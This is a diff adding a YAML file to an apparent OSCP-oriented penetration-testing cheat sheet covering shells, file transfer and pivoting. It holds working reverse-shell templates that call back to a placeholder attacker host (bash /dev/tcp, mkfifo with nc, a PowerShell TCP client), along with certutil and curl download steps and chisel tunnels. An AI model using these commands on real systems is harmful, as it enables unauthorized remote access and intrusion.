@@ -1,0 +1,301 @@
+# Cephalo content — Cross-Cutting realm (shells, transfers, pivoting)
+# Authorized testing only. Methodology + canonical syntax — no weaponized payloads.
+# Cross-cutting techniques span OSes and carry the 'cross-cutting' tag; the
+# /cross-cutting/:topic route aggregates them by topic tag.
+sections:
+  - id: xcut.shells
+    title: Shells & Listeners
+    os: linux
+    phase: foothold
+    order: 50
+    description: Catch, spawn, and stabilise reverse shells across OSes.
+    techniques: [xcut.shells.listener, xcut.shells.revshell, xcut.shells.upgrade]
+    packs: [oscp]
+  - id: xcut.transfer
+    title: File Transfer
+    os: linux
+    phase: post-exploitation
+    order: 70
+    description: Move tools and loot in both directions, on Linux and Windows.
+    techniques: [xcut.transfer.serve, xcut.transfer.pull]
+    packs: [oscp]
+  - id: xcut.pivot
+    title: Pivoting & Tunneling
+    os: linux
+    phase: pivoting
+    order: 90
+    description: Reach internal networks through a compromised foothold.
+    techniques: [xcut.pivot.chisel, xcut.pivot.ssh]
+    packs: [oscp]
+
+techniques:
+  - id: xcut.shells.listener
+    title: Catch a shell
+    os: [linux, windows, ad]
+    phase: foothold
+    summary: Stand up a listener (and make it comfortable).
+    commands: [xcut.shells.nc-listen, xcut.shells.rlwrap]
+    tags: [cross-cutting, pivoting]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: xcut.shells.revshell
+    title: Reverse shell one-liners
+    os: [linux, windows, ad]
+    phase: foothold
+    summary: Canonical bash / nc / PowerShell callbacks (RevShells loop).
+    body: |
+      The original RevShells use case: set LHOST/LPORT once and copy the right
+      callback for the target. Methodology only — these are canonical syntaxes,
+      not an exploit.
+    commands: [xcut.shells.bash, xcut.shells.mkfifo, xcut.shells.powershell]
+    tags: [cross-cutting]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.hacktricks, ref.patt]
+    confidence: verified
+    packs: [oscp]
+
+  - id: xcut.shells.upgrade
+    title: Stabilise a TTY
+    os: [linux]
+    phase: foothold
+    summary: Upgrade a dumb shell to a fully interactive PTY.
+    commands: [xcut.shells.pty]
+    relatedIds: [linux.shell.bind, linux.shell.pwncat]
+    tags: [cross-cutting]
+    archetypeBand: high
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: xcut.transfer.serve
+    title: Serve files from your box
+    os: [linux]
+    phase: post-exploitation
+    summary: HTTP / SMB servers to deliver tooling.
+    commands: [xcut.transfer.http, xcut.transfer.smbserver]
+    tags: [cross-cutting]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.impacket, ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: xcut.transfer.pull
+    title: Pull files onto the target
+    os: [linux, windows]
+    phase: post-exploitation
+    summary: Download tooling on Linux (wget/curl) and Windows (certutil/iwr).
+    commands: [xcut.transfer.curl, xcut.transfer.certutil]
+    tags: [cross-cutting]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.lolbas]
+    confidence: verified
+    packs: [oscp]
+
+  - id: xcut.pivot.chisel
+    title: Pivot with chisel
+    os: [linux, windows, ad]
+    phase: pivoting
+    summary: Reverse SOCKS proxy through a foothold to reach the internal net.
+    body: |
+      Run a chisel server on your box and a reverse client on the foothold to
+      expose a SOCKS proxy; point proxychains at it for deep enumeration.
+    commands: [xcut.pivot.chisel.server, xcut.pivot.chisel.client]
+    tags: [cross-cutting, pivoting]
+    archetypeBand: high
+    references: [ref.chisel]
+    confidence: verified
+    packs: [oscp]
+
+  - id: xcut.pivot.ssh
+    title: SSH dynamic port-forward
+    os: [linux]
+    phase: pivoting
+    summary: A SOCKS proxy over SSH when you hold creds on a Linux pivot.
+    commands: [xcut.pivot.ssh.dynamic]
+    tags: [cross-cutting, pivoting]
+    archetypeBand: medium
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+commands:
+  - id: xcut.shells.nc-listen
+    title: Netcat listener
+    template: "nc -lvnp {{LPORT}}"
+    tool: netcat
+    description: Listen for an inbound reverse shell.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: xcut.shells.rlwrap
+    title: rlwrap listener (Windows shells)
+    template: "rlwrap nc -lvnp {{LPORT}}"
+    tool: rlwrap
+    description: Wrap the listener with readline for arrow keys/history.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+
+  - id: xcut.shells.bash
+    title: Bash /dev/tcp reverse shell
+    template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
+    tool: bash
+    description: Pure-bash callback when /dev/tcp is available.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks, ref.patt]
+    danger: medium
+    packs: [oscp]
+  - id: xcut.shells.mkfifo
+    title: mkfifo + nc reverse shell
+    template: "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{LHOST}} {{LPORT}} >/tmp/f"
+    tool: netcat
+    description: Reliable callback when nc lacks -e.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks, ref.patt]
+    danger: medium
+    packs: [oscp]
+  - id: xcut.shells.powershell
+    title: PowerShell reverse shell
+    template: "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sx=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sx,0,$sx.Length);$s.Flush()}\""
+    shell: powershell
+    description: Canonical PowerShell TCP reverse shell (hand-quoted, not bash).
+    os: [windows]
+    phase: foothold
+    tags: [cross-cutting]
+    notes:
+      - "AMSI/AV may flag this verbatim — methodology reference, not an evasion build."
+    confidence: verified
+    references: [ref.patt]
+    danger: medium
+    packs: [oscp]
+
+  - id: xcut.shells.pty
+    title: Upgrade to a PTY
+    template: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm"
+    description: Spawn a PTY, then background and run 'stty raw -echo; fg' locally.
+    os: [linux]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+    variants:
+      - id: xcut.shells.pty.python
+        label: python3 pty.spawn
+        template: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm"
+      - id: xcut.shells.pty.script
+        label: script
+        template: "script -qc /bin/bash /dev/null"
+      - id: xcut.shells.pty.stty
+        label: stty raw (full upgrade, local)
+        template: "stty raw -echo; fg"
+      - id: xcut.shells.pty.socat
+        label: socat pty (fully interactive)
+        template: "socat file:`tty`,raw,echo=0 tcp-listen:{{LPORT}}"
+
+  - id: xcut.transfer.http
+    title: Python HTTP server
+    template: "python3 -m http.server 80"
+    description: Serve the current directory over HTTP for target-side pulls.
+    os: [linux]
+    phase: post-exploitation
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: xcut.transfer.smbserver
+    title: Impacket SMB server
+    template: "impacket-smbserver share . -smb2support -user '{{USER}}' -password '{{PASS}}'"
+    tool: impacket
+    description: Stand up an authenticated SMB share for Windows transfers.
+    os: [linux]
+    phase: post-exploitation
+    tags: [cross-cutting, smb]
+    confidence: verified
+    references: [ref.impacket]
+    danger: low
+    packs: [oscp]
+
+  - id: xcut.transfer.curl
+    title: curl / wget download
+    template: "curl -s http://{{LHOST}}/tool -o /tmp/tool && chmod +x /tmp/tool"
+    description: Pull a tool onto a Linux target.
+    os: [linux]
+    phase: post-exploitation
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: xcut.transfer.certutil
+    title: certutil download (Windows)
+    template: "certutil -urlcache -split -f http://{{LHOST}}/tool.exe C:\\Windows\\Temp\\tool.exe"
+    shell: cmd
+    description: LOLBAS download via certutil.
+    os: [windows]
+    phase: post-exploitation
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+
+  - id: xcut.pivot.chisel.server
+    title: chisel server (your box)
+    template: "./chisel server -p {{LPORT}} --reverse"
+    tool: chisel
+    description: Reverse server awaiting the foothold's client.
+    os: [linux]
+    phase: pivoting
+    tags: [cross-cutting, pivoting]
+    confidence: verified
+    references: [ref.chisel]
+    danger: low
+    packs: [oscp]
+  - id: xcut.pivot.chisel.client
+    title: chisel reverse SOCKS (foothold)
+    template: "./chisel client {{LHOST}}:{{LPORT}} R:1080:socks"
+    tool: chisel
+    description: Expose a SOCKS5 proxy back to your server; use with proxychains.
+    os: [linux, windows]
+    phase: pivoting
+    tags: [cross-cutting, pivoting]
+    confidence: verified
+    references: [ref.chisel]
+    danger: low
+    packs: [oscp]
+
+  - id: xcut.pivot.ssh.dynamic
+    title: SSH dynamic SOCKS
+    template: "ssh -D 1080 -N {{USER}}@{{RHOST}}"
+    description: Open a SOCKS proxy through an SSH pivot you hold creds on.
+    os: [linux]
+    phase: pivoting
+    tags: [cross-cutting, pivoting]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
